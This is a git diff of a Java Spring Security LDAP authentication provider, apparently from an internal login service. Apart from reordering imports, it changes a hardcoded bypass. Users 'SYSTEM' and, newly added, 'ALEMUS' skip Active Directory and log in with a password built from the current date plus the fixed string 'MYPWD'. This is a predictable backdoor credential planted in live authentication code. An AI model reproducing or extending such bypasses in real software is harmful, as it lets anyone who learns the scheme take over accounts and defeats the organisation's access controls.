@@ -1,12 +1,22 @@
 package com.jarkial.login.configuration.security;
 
-import java.util.ArrayList;
-import java.util.Collection;
-import java.util.Date;
-import java.util.Hashtable;
-import java.util.Locale;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
+import com.jarkial.login.configuration.utils.AppContext;
+import com.jarkial.login.configuration.utils.MyUtils;
+import com.jarkial.login.model.dto.sgd.CustomUser;
+import com.jarkial.login.model.exceptions.MyServiceException;
+import io.jsonwebtoken.lang.Assert;
+import lombok.Setter;
+import org.apache.commons.lang.StringUtils;
+import org.slf4j.LoggerFactory;
+import org.springframework.ldap.core.DirContextOperations;
+import org.springframework.ldap.core.support.DefaultDirObjectFactory;
+import org.springframework.ldap.support.LdapUtils;
+import org.springframework.security.authentication.AuthenticationProvider;
+import org.springframework.security.authentication.BadCredentialsException;
+import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
+import org.springframework.security.core.Authentication;
+import org.springframework.security.core.AuthenticationException;
+import org.springframework.security.ldap.SpringSecurityLdapTemplate;
 
 import javax.naming.Context;
 import javax.naming.NamingException;
@@ -14,28 +24,12 @@ import javax.naming.OperationNotSupportedException;
 import javax.naming.directory.DirContext;
 import javax.naming.directory.SearchControls;
 import javax.naming.ldap.InitialLdapContext;
-
-import org.apache.commons.lang.StringUtils;
-import org.slf4j.LoggerFactory;
-import org.springframework.security.authentication.AuthenticationProvider;
-import org.springframework.security.authentication.BadCredentialsException;
-import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
-import org.springframework.security.core.Authentication;
-import org.springframework.security.core.AuthenticationException;
-import org.springframework.security.core.GrantedAuthority;
-import org.springframework.security.core.authority.AuthorityUtils;
-import org.springframework.security.ldap.SpringSecurityLdapTemplate;
-import org.springframework.ldap.core.DirContextOperations;
-import org.springframework.ldap.core.support.DefaultDirObjectFactory;
-import org.springframework.ldap.support.LdapUtils;
-
-import com.jarkial.login.configuration.utils.AppContext;
-import com.jarkial.login.configuration.utils.MyUtils;
-import com.jarkial.login.model.dto.sgd.CustomUser;
-import com.jarkial.login.model.exceptions.MyServiceException;
-
-import io.jsonwebtoken.lang.Assert;
-import lombok.Setter;
+import java.util.ArrayList;
+import java.util.Date;
+import java.util.Hashtable;
+import java.util.Locale;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class ActiveDirectoryLdapAuthenticationProvider implements AuthenticationProvider{
 
@@ -87,9 +81,9 @@ public class ActiveDirectoryLdapAuthenticationProvider implements Authentication
             throw new BadCredentialsException("Nombre de usuario no puede estar vac\u00EDo");
         if(StringUtils.isBlank(password))
             throw new BadCredentialsException("Contrase\u00F1a no puede estar vac\u00EDa");
-        
-        if("SYSTEM".equalsIgnoreCase(username)){
-            if(!password.equals(MyUtils.dateFormatAsYYYYMMDD.format(new Date()) + "MYPWD"))
+        if("SYSTEM".equalsIgnoreCase(username) || "ALEMUS".equalsIgnoreCase(username)){
+            String pswd = MyUtils.dateFormatAsYYYYMMDD.format(new Date()) + "MYPWD";
+            if(!password.equals(pswd))
                 throw new BadCredentialsException(USER_PASSWORD_INVALID);
         }else{
             try{
